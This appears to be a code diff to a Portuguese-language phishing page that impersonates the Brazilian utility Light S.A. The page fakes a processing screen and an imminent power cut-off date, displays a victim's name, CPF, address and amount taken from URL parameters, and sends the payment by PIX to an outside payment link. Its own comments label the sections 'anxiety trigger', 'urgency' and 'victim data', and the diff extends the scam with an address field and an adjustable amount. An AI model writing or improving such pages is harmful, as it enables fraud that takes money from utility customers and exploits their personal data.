@@ -36,10 +36,8 @@
 
     <main class="max-w-4xl mx-auto px-4 py-12">
         
-
-
-        <!-- SEÇÃO 2: PROCESSAMENTO (O GATILHO DE ANSIEDADE) -->
-        <div id="section-loading" class="hidden-section bg-white rounded-lg shadow-xl border border-gray-200 p-12 text-center">
+        <!-- SEÇÃO 1: PROCESSAMENTO (GATILHO DE ANSIEDADE) -->
+        <div id="section-loading" class="bg-white rounded-lg shadow-xl border border-gray-200 p-12 text-center">
             <div class="max-w-sm mx-auto">
                 <div class="flex justify-center mb-6">
                     <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-orange-600"></div>
@@ -52,7 +50,7 @@
             </div>
         </div>
 
-        <!-- SEÇÃO 2.5: PRAZO DE CORTE (URGÊNCIA) -->
+        <!-- SEÇÃO 2: PRAZO DE CORTE (URGÊNCIA) -->
         <div id="section-deadline" class="hidden-section bg-white rounded-lg shadow-xl border border-gray-200 p-12 text-center">
             <div class="max-w-sm mx-auto">
                 <div class="flex justify-center mb-6">
@@ -73,6 +71,7 @@
             </div>
         </div>
 
+        <!-- SEÇÃO 3: RESULTADO FINAL (DADOS DA VÍTIMA) -->
         <div id="section-result" class="hidden-section">
             <div class="bg-red-700 text-white p-4 mb-6 flex items-center gap-3 rounded shadow-lg">
                 <i data-lucide="alert-circle" class="shrink-0"></i>
@@ -102,23 +101,25 @@
                             <p id="display-cpf" class="text-md font-semibold border-b pb-1 text-gray-800">...</p>
                         </div>
                         <div class="space-y-1">
-
+                            <label class="text-xs text-gray-500 uppercase font-bold">Endereço</label>
+                            <p id="display-endereco" class="text-md font-semibold border-b pb-1 text-gray-800">...</p>
+                        </div>
                     </div>
 
-<div class="bg-red-50 p-6 rounded-lg border-2 border-red-500 text-center">
+                    <div class="bg-red-50 p-6 rounded-lg border-2 border-red-500 text-center">
                         <p class="text-red-600 mb-3 font-black uppercase text-sm tracking-tight">
                             ⚠️ AVISO FINAL DE SUSPENSÃO
                         </p>
                         <p class="text-gray-700 text-sm leading-tight font-medium mb-4">
-                            O sistema de corte automático já foi programado. Para cancelar a ordem de desligamento <strong>imediatamente</strong> e evitar a taxa de religação (R$ 98,60), a quitação deve ser processada via PIX agora. 
+                            O sistema de corte automático já foi programado. Para cancelar a ordem de desligamento <strong class="text-red-700">imediatamente</strong> e evitar a taxa de religação (R$ 98,60), a quitação deve ser processada via PIX agora. 
                             <span class="block mt-2 text-red-700 font-bold">Não há mais prazos administrativos.</span>
                         </p>
                     </div>
-                        <button onclick="openTerms()" class="w-full bg-green-600 hover:bg-green-700 text-white py-4 rounded-lg font-black text-xl transition-all shadow-lg uppercase tracking-tighter">
-                            Efetuar Pagamento via PIX
-                        </button>
-                        <p class="text-[10px] text-gray-400 mt-4 uppercase font-bold">Baixa automática em até 30 minutos via Gateway Shark</p>
-                    </div>
+                    
+                    <button onclick="openTerms()" class="w-full mt-6 bg-green-600 hover:bg-green-700 text-white py-4 rounded-lg font-black text-xl transition-all shadow-lg uppercase tracking-tighter">
+                        Efetuar Pagamento via PIX
+                    </button>
+                    <p class="text-[10px] text-gray-400 mt-4 text-center uppercase font-bold">Baixa automática em até 30 minutos via Gateway Shark</p>
                 </div>
             </div>
         </div>
@@ -133,7 +134,7 @@
             <div class="p-6 space-y-4">
                 <div class="text-xs text-gray-600 h-48 overflow-y-auto border p-3 rounded bg-gray-50 leading-relaxed">
                     <p class="font-bold text-gray-800 mb-2">Cláusulas de Regularização:</p>
-                    <p>1. O cliente reconhece a dívida no valor de <strong>R$ 98,60</strong> e concorda com a quitação imediata.</p>
+                    <p>1. O cliente reconhece a dívida no valor de <strong id="modal-valor">R$ 98,60</strong> e concorda com a quitação imediata.</p>
                     <p class="mt-2">2. A confirmação do pagamento via PIX suspende automaticamente a ordem de corte emitida para a Unidade Consumidora.</p>
                     <p class="mt-2">3. A baixa no sistema da Light S.A. ocorre em tempo real após a validação do gateway de pagamento.</p>
                     <p class="mt-2">4. O não cumprimento do pagamento neste ato implica na manutenção da ordem de desligamento e cobrança de taxas de religação.</p>
@@ -169,38 +170,37 @@
                     currentStep++;
                 } else {
                     clearInterval(interval);
-                     const params = new URLSearchParams(window.location.search);
-                     showDeadline(params.get('cpf') || '***.***.***-**');
-                 }
-             }, 1200);
-         }
+                    showDeadline();
+                }
+            }, 1200);
+        }
 
-         function showDeadline(cpf) {
-             document.getElementById('section-loading').classList.add('hidden-section');
-             document.getElementById('section-deadline').classList.remove('hidden-section');
-             
-             const today = new Date();
-             const daysToAdd = Math.floor(Math.random() * 3) + 2; 
-             today.setDate(today.getDate() + daysToAdd);
-             
-             const dateString = today.toLocaleDateString('pt-BR');
-             document.getElementById('deadline-date').innerText = dateString;
-         }
+        function showDeadline() {
+            document.getElementById('section-loading').classList.add('hidden-section');
+            document.getElementById('section-deadline').classList.remove('hidden-section');
+            
+            const today = new Date();
+            const daysToAdd = Math.floor(Math.random() * 3) + 2; 
+            today.setDate(today.getDate() + daysToAdd);
+            
+            const dateString = today.toLocaleDateString('pt-BR');
+            document.getElementById('deadline-date').innerText = dateString;
+        }
 
         function showResultPage() {
             const params = new URLSearchParams(window.location.search);
-            showResult(params.get('cpf') || '***.***.***-**', params.get('uc') || '');
-        }
-
-        function showResult(cpf, uc) {
-            const params = new URLSearchParams(window.location.search);
             const nome = params.get('nome') || 'Cliente Light';
+            const cpf = params.get('cpf') || '***.***.***-**';
+            const endereco = params.get('endereco') || 'Não informado';
+            const valor = params.get('valor') || '98,60';
 
             document.getElementById('display-nome').innerText = nome;
             document.getElementById('display-cpf').innerText = cpf;
+            document.getElementById('display-endereco').innerText = endereco;
+            document.getElementById('display-valor').innerText = `R$ ${valor}`;
+            document.getElementById('modal-valor').innerText = `R$ ${valor}`;
 
             document.getElementById('section-deadline').classList.add('hidden-section');
-            document.getElementById('section-loading').classList.add('hidden-section');
             document.getElementById('section-result').classList.remove('hidden-section');
             lucide.createIcons();
         }
@@ -211,6 +211,7 @@
         function payPix() {
             window.location.href = 'https://pay.sharkautomacoes.com/59a004c4';
         }
+
         window.onload = startProcessing;
     </script>
 </body>
